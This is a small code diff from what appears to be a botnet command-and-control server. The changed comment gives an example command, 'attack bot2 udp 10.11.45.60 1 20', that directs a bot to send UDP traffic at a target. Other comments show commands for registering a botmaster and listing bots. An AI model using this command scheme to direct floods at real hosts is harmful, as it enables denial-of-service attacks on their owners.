@@ -16,7 +16,7 @@ async def handle_client(reader, writer):
         # register botmaster
         # list
         # rst bot1
-        # attack bot2 1.1.1.1:53 udp
+        # attack bot2 udp 10.11.45.60 1 20
         # register bot1
         message = data.decode()
         para = message.split(' ',2)
